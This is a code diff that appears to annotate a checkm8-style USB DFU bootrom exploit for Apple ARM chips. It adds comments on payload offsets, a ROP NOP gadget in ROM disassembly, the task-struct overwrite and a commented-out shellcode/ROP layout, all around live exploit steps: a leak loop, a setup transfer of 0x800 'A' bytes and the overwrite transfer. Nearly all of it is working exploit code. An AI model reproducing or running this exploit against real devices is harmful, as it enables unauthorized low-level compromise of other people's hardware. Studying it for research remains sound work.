@@ -142,7 +142,7 @@ class DeviceConfig:
 
 PAYLOAD_OFFSET_ARMV7 = 384
 PAYLOAD_SIZE_ARMV7   = 320
-PAYLOAD_OFFSET_ARM64 = 384
+PAYLOAD_OFFSET_ARM64 = 384  # 0x180
 PAYLOAD_SIZE_ARM64   = 576
 
 def payload(cpid):
@@ -494,7 +494,7 @@ def exploit():
   dfu.usb_reset(device)
   dfu.release_device(device)
 
-  print("****** stage 2, usb setup, send 0x800 of 'A'")
+  print("****** stage 2, usb setup, send 0x800 of 'A', sends no data")
   device = dfu.acquire_device()
   device.serial_number
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
@@ -514,15 +514,23 @@ def exploit():
     for i in range(config.leak):
       usb_req_leak(device)
 
+  # https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4
   # this is the real smash, what's in overwrite
   # t8010_nop_gadget = 0x10000CC6C
   """
-  ROM:000000010000CC6C                 LDP             X29, X30, [SP,#0x10+var_s0] ; this is the nop gadget?
-  ROM:000000010000CC70                 LDP             X20, X19, [SP+0x10+var_10],#0x20
+  ROM:000000010000CC6C                 LDP             X29, X30, [SP,#0x10] ; this is the nop gadget?
+  ROM:000000010000CC70                 LDP             X20, X19, [SP],#0x20
   ROM:000000010000CC74                 RET
   """
   # t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q',             t8010_nop_gadget, 0x1800B0800)
+  # SP = 0x1800B0800?
+  # This overwrites the task struct
   libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 10)
+
+  #return struct.pack('<1024sQ504x2Q496s32x',
+  #  0x400 = t8010_shellcode,
+  #  0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) +
+  #  usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
 
   # upload the payload, or actually, this is after the pwning happens and this is exec
   # this is usb_0xA1_2_arm64 and checkm8_arm64
